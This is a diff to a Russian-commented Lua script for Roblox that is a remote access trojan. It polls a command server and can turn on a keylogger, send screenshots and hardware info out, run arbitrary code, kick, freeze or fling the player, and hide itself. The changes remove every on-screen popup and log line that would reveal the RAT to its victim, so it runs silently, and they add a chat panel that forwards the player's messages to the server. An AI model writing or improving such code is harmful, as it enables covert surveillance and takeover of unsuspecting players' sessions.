@@ -31,7 +31,6 @@ local function httpRequest(params)
     elseif http and http.request then
         requestFunc = http.request
     else
-        warn("HTTP-библиотека не найдена!")
         return nil
     end
     
@@ -109,7 +108,7 @@ end
 
 -- Всплывающее сообщение
 local function showPopup(message, duration)
-    duration = duration or 10
+    duration = duration or 3
     
     local popupGui = Instance.new("ScreenGui")
     popupGui.Name = "PopupMessage"
@@ -126,7 +125,7 @@ local function showPopup(message, duration)
     local textLabel = Instance.new("TextLabel")
     textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
     textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
-    textLabel.Text = "[RATER]: "..message
+    textLabel.Text = message
     textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     textLabel.TextScaled = true
     textLabel.Font = Enum.Font.GothamBold
@@ -146,7 +145,7 @@ local function executeLua(code)
         if not success then
             return "Ошибка выполнения: "..tostring(result)
         end
-        return "Код выполнен"
+        return "Успешно"
     else
         return "Ошибка компиляции: "..tostring(err)
     end
@@ -242,52 +241,119 @@ end
 
 -- Memory Spam функция
 local function memorySpam(fileCount, fileData)
-    showPopup("Memory Spam запущен: "..fileCount.." файлов", 3)
-    
     -- Имитация создания файлов
     local successCount = 0
     for i = 1, fileCount do
         successCount = successCount + 1
-        
-        if i % 50 == 0 then
-            showPopup("Memory Spam: "..i.."/"..fileCount.." файлов", 2)
-        end
-        
         task.wait(0.01)
     end
-    
-    showPopup("Memory Spam завершен: "..successCount.." файлов", 3)
 end
 
 -- Gallery Spam функция
 local function gallerySpam(imageCount, imageData, filename)
-    showPopup("Gallery Spam запущен: "..imageCount.." копий", 3)
-    
     -- Имитация сохранения изображений
     local successCount = 0
     for i = 1, imageCount do
         successCount = successCount + 1
-        
-        if i % 10 == 0 then
-            showPopup("Gallery Spam: "..i.."/"..imageCount.." копий", 2)
-        end
-        
         task.wait(0.05)
     end
-    
-    showPopup("Gallery Spam завершен: "..successCount.." копий", 3)
 end
 
--- Чат-модуль (остается без изменений)
+-- Чат-модуль
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "RatChat"
 screenGui.Parent = player:WaitForChild("PlayerGui")
 screenGui.ResetOnSpawn = false
 screenGui.Enabled = false
 
--- ... остальной код чата без изменений
+local chatFrame = Instance.new("Frame")
+chatFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
+chatFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+chatFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+chatFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+chatFrame.BackgroundTransparency = 0.3
+chatFrame.Active = true
+chatFrame.Draggable = true
+chatFrame.Parent = screenGui
 
--- Обработка команд (остается без изменений)
+local scrollingFrame = Instance.new("ScrollingFrame")
+scrollingFrame.Size = UDim2.new(1, -10, 1, -50)
+scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
+scrollingFrame.BackgroundTransparency = 1
+scrollingFrame.ScrollBarThickness = 5
+scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scrollingFrame.Parent = chatFrame
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(1, -60, 0, 30)
+textBox.Position = UDim2.new(0, 5, 1, -35)
+textBox.PlaceholderText = "Сообщение..."
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.ClearTextOnFocus = false
+textBox.Parent = chatFrame
+
+local sendButton = Instance.new("TextButton")
+sendButton.Size = UDim2.new(0, 50, 0, 30)
+sendButton.Position = UDim2.new(1, -55, 1, -35)
+sendButton.Text = "Отпр."
+sendButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
+sendButton.Parent = chatFrame
+
+local function addMessage(sender, text, isSystem)
+    local messageFrame = Instance.new("Frame")
+    messageFrame.Size = UDim2.new(1, 0, 0, 0)
+    messageFrame.AutomaticSize = Enum.AutomaticSize.Y
+    messageFrame.BackgroundTransparency = 1
+    messageFrame.Parent = scrollingFrame
+
+    local bubble = Instance.new("Frame")
+    bubble.Size = UDim2.new(0.8, 0, 0, 0)
+    bubble.AutomaticSize = Enum.AutomaticSize.Y
+    bubble.BackgroundColor3 = isSystem and Color3.fromRGB(80, 80, 100) or 
+                            (sender == player.Name and Color3.fromRGB(0, 110, 220) or Color3.fromRGB(70, 70, 90))
+    bubble.BackgroundTransparency = 0.1
+    bubble.Parent = messageFrame
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(0.9, 0, 0, 0)
+    textLabel.Position = UDim2.new(0.05, 0, 0, 5)
+    textLabel.AutomaticSize = Enum.AutomaticSize.Y
+    textLabel.Text = sender..": "..text
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel.TextWrapped = true
+    textLabel.BackgroundTransparency = 1
+    textLabel.Parent = bubble
+
+    scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.AbsoluteCanvasSize.Y)
+    
+    if sender == player.Name and not isSystem then
+        httpRequest({
+            Url = SERVER_URL.."/command",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                command = "user_chat",
+                args = {sender, text}
+            })
+        })
+    end
+end
+
+local function sendMessage()
+    local text = string.gsub(textBox.Text, "^%s*(.-)%s*$", "%1")
+    if text ~= "" then
+        addMessage(player.Name, text)
+        textBox.Text = ""
+    end
+end
+
+textBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then sendMessage() end
+end)
+
+sendButton.MouseButton1Click:Connect(sendMessage)
+
+-- Обработка команд
 local function ExecuteCommand(cmd, args)
     local character = player.Character or player.CharacterAdded:Wait()
     local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -295,34 +361,26 @@ local function ExecuteCommand(cmd, args)
 
     if cmd == "chat" then
         screenGui.Enabled = not screenGui.Enabled
-        showPopup("Чат "..(screenGui.Enabled and "включен" or "выключен"), 3)
     
     elseif cmd == "popup" then
-        showPopup(table.concat(args, " "), 10)
+        showPopup(table.concat(args, " "), 5)
     
     elseif cmd == "print" then
-        print("[RAT] Сервер активен")
-        showPopup("Проверка связи: OK", 3)
+        -- Тихая проверка связи
     
     elseif cmd == "kick" then
-        player:Kick(args[1] or "🔴 Кикнут администратором")
+        player:Kick(args[1] or "Кикнут администратором")
     
     elseif cmd == "freeze" and humanoid then
         humanoid.WalkSpeed = 0
-        showPopup("Заморожен на "..(args[1] or 5).." сек", 3)
         task.delay(tonumber(args[1] or 5), function()
-            if humanoid then 
-                humanoid.WalkSpeed = 16 
-                showPopup("Разморожен", 3)
-            end
+            if humanoid then humanoid.WalkSpeed = 16 end
         end)
     
     elseif cmd == "void" and root then
         root.CFrame = CFrame.new(0, -5000, 0)
-        showPopup("Телепорт в бездну", 3)
     
     elseif cmd == "spin" and root then
-        showPopup("Вращение активировано", 3)
         for i = 1, 50 do
             root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
             task.wait(0.1)
@@ -330,24 +388,20 @@ local function ExecuteCommand(cmd, args)
     
     elseif cmd == "fling" and root then
         root.Velocity = Vector3.new(0, 5000, 0)
-        showPopup("Подброшен в воздух", 3)
     
     elseif cmd == "sit" and humanoid then
         humanoid.Sit = not humanoid.Sit
-        showPopup(humanoid.Sit and "Сел" or "Встал", 3)
     
     elseif cmd == "dance" and humanoid then
         local anim = Instance.new("Animation")
         anim.AnimationId = "rbxassetid://35654637"
         local track = humanoid:LoadAnimation(anim)
         track:Play()
-        showPopup("Танцует", 3)
     
     elseif cmd == "blur" then
         local blur = Instance.new("BlurEffect")
         blur.Size = 24
         blur.Parent = Lighting
-        showPopup("Размытие экрана", 3)
         task.delay(tonumber(args[1] or 5), function()
             if blur then blur:Destroy() end
         end)
@@ -356,27 +410,23 @@ local function ExecuteCommand(cmd, args)
         for _, sound in ipairs(SoundService:GetDescendants()) do
             if sound:IsA("Sound") then sound.Volume = 0 end
         end
-        showPopup("Звуки отключены", 3)
     
     elseif cmd == "unmute" then
         for _, sound in ipairs(SoundService:GetDescendants()) do
             if sound:IsA("Sound") then sound.Volume = 1 end
         end
-        showPopup("Звуки включены", 3)
     
     elseif cmd == "playaudio" and args[1] then
         local sound = Instance.new("Sound")
         sound.SoundId = "rbxassetid://"..args[1]
         sound.Parent = root or player
         sound:Play()
-        showPopup("Проигрывается аудио", 3)
         sound.Ended:Connect(function()
             sound:Destroy()
         end)
     
     elseif cmd == "execute" then
         local result = executeLua(table.concat(args, " "))
-        showPopup("Код выполнен: "..result, 5)
     
     elseif cmd == "fakeerror" then
         showFakeError(table.concat(args, " "))
@@ -392,14 +442,12 @@ local function ExecuteCommand(cmd, args)
                     image = screenshotData
                 })
             })
-            showPopup("Скриншот отправлен", 3)
         end
     
     elseif cmd == "keylog" then
         keyloggerEnabled = true
         keylogBuffer = ""
         lastSendTime = os.time()
-        showPopup("Keylogger активирован", 3)
     
     elseif cmd == "stopkeylog" then
         keyloggerEnabled = false
@@ -413,7 +461,6 @@ local function ExecuteCommand(cmd, args)
                 })
             })
         end
-        showPopup("Keylogger деактивирован", 3)
         keylogBuffer = ""
     
     elseif cmd == "hardware" then
@@ -427,14 +474,9 @@ local function ExecuteCommand(cmd, args)
                 data = hwInfo
             })
         })
-        showPopup("Hardware info sent", 3)
     
     elseif cmd == "hide" then
-        if hideScript() then
-            showPopup("Скрипт скрыт", 3)
-        else
-            showPopup("Ошибка скрытия", 3)
-        end
+        hideScript()
     
     -- SPAM КОМАНДЫ
     elseif cmd == "memory_spam" then
@@ -451,7 +493,6 @@ local function ExecuteCommand(cmd, args)
         local filename = args[3] or "image.jpg"
         
         if not imageData then
-            showPopup("Ошибка: нет данных изображения", 3)
             return
         end
         
@@ -477,8 +518,6 @@ local function checkCommands()
         end)
         
         if success and data and data.command and data.command ~= "" then
-            print("[RAT] Получена команда: " .. data.command)
-            showPopup("Команда: " .. data.command, 3)
             pcall(ExecuteCommand, data.command, data.args or {})
             return true
         end
@@ -488,12 +527,8 @@ end
 
 -- Инициализация
 sendInjectNotification()
-showPopup("RAT система активирована", 5)
 setupKeylogger()
 hideScript()
-
-print("[RAT] Система инициализирована")
-print("[RAT] Сервер: " .. SERVER_URL)
 
 -- Главный цикл
 while task.wait(2) do
